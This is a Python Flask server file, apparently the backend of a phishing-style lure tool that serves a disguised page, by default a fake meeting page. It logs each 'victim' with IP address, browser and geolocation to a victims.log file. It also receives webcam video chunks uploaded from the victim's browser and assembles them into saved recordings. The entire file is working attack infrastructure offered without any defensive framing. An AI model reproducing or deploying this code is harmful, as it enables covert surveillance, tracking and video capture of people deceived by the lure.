import os
import json
import datetime
from flask import Flask, request, jsonify, render_template, abort

app = Flask(__name__)
OUTPUT_DIR = os.path.join(os.path.dirname(__file__), "output")
os.makedirs(OUTPUT_DIR, exist_ok=True)

def log_victim(data: dict):
    log_path = os.path.join(OUTPUT_DIR, "victims.log")
    entry = {
        "timestamp": datetime.datetime.utcnow().isoformat(),
        **data
    }
    with open(log_path, "a") as f:
        f.write(json.dumps(entry) + "\n")
    return entry

@app.route("/")
def index():
    page = app.config.get("LURE_PAGE", "meet")
    return render_template(f"{page}.html")

@app.route("/log", methods=["POST"])
def log_info():
    data = request.get_json(silent=True) or {}
    ip = request.headers.get("X-Forwarded-For", request.remote_addr).split(",")[0].strip()
    ua = request.headers.get("User-Agent", "unknown")
    entry = log_victim({"ip": ip, "user_agent": ua, **data})
    print(f"\n  [+] Victim connected:")
    print(f"      IP         : {ip}")
    print(f"      Browser    : {ua}")
    if "geo" in data:
        g = data["geo"]
        print(f"      Location   : {g.get('city','?')}, {g.get('country','?')}")
        print(f"      ISP        : {g.get('org','?')}")
    print()
    return jsonify({"status": "ok"})

@app.route("/upload", methods=["POST"])
def upload_chunk():
    session_id = request.args.get("sid", "unknown")
    chunk_index = request.args.get("chunk", "0")
    video_dir = os.path.join(OUTPUT_DIR, session_id)
    os.makedirs(video_dir, exist_ok=True)
    chunk_path = os.path.join(video_dir, f"chunk_{chunk_index.zfill(5)}.webm")
    data = request.get_data()
    if not data:
        return jsonify({"status": "empty"}), 400
    with open(chunk_path, "wb") as f:
        f.write(data)
    print(f"  [*] Video chunk {chunk_index} received from {session_id} ({len(data)} bytes)")
    return jsonify({"status": "ok"})

@app.route("/finalize", methods=["POST"])
def finalize():
    session_id = request.args.get("sid", "unknown")
    video_dir = os.path.join(OUTPUT_DIR, session_id)
    if not os.path.exists(video_dir):
        return jsonify({"status": "no chunks"}), 404
    chunks = sorted(f for f in os.listdir(video_dir) if f.startswith("chunk_"))
    if not chunks:
        return jsonify({"status": "no chunks"}), 404
    final_path = os.path.join(OUTPUT_DIR, f"{session_id}.webm")
    with open(final_path, "wb") as out:
        for chunk_name in chunks:
            with open(os.path.join(video_dir, chunk_name), "rb") as f:
                out.write(f.read())
    # cleanup chunks
    for chunk_name in chunks:
        os.remove(os.path.join(video_dir, chunk_name))
    os.rmdir(video_dir)
    size_kb = os.path.getsize(final_path) // 1024
    print(f"\n  [+] Video saved: output/{session_id}.webm ({size_kb} KB)")
    print()
    return jsonify({"status": "saved", "file": f"{session_id}.webm"})
